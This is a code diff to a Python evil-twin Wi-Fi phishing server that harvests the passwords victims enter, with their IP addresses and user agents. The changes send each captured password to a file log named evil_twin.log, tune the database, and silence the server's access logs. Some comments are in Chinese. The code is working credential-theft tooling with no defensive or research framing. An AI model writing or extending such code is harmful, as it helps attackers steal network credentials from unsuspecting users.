@@ -12,6 +12,8 @@ DB_PATH = 'evil_twin.db'
 def get_db():
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
+    conn.execute("PRAGMA journal_mode=WAL")
+    conn.execute("PRAGMA synchronous=NORMAL")
     return conn
 
 # ==================== 页面路由 ====================
@@ -331,7 +333,12 @@ def capture():
     conn.commit()
     conn.close()
     
-    print(f"[!] Captured: Password='{password}' | IP={client_ip} | UA={user_agent}")
+    try:
+        log_capture
+    except NameError:
+        print(f"[!] Captured: Password='{password}' | IP={client_ip} | UA={user_agent}")
+    else:
+        log_capture(password, client_ip, user_agent)
     
     # 返回错误页面，引导用户连接真实WiFi
     return render_template('capture_error.html'), 401
@@ -414,5 +421,24 @@ def restart_hotspot():
     start_evil_twin()
 
 if __name__ == '__main__':
+    import logging, atexit
+
+    # 访问日志写到文件（不刷屏），每天轮转
+    capture_log = logging.getLogger('capture')
+    capture_log.setLevel(logging.INFO)
+    fh = logging.FileHandler('evil_twin.log', encoding='utf-8')
+    fh.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
+    capture_log.addHandler(fh)
+
+    def log_capture(password, ip, ua):
+        capture_log.info(f"Captured: Password='{password}' IP={ip} UA={ua}")
+
+    # 禁用 waitress 访问日志（防爆终端）
+    import waitress
+    waitress_log = logging.getLogger('waitress')
+    waitress_log.setLevel(logging.ERROR)
+
+    atexit.register(lambda: logging.shutdown())
+
     from waitress import serve
-    serve(app, host='0.0.0.0', port=5000)
+    serve(app, host='0.0.0.0', port=5000, _quiet=True)
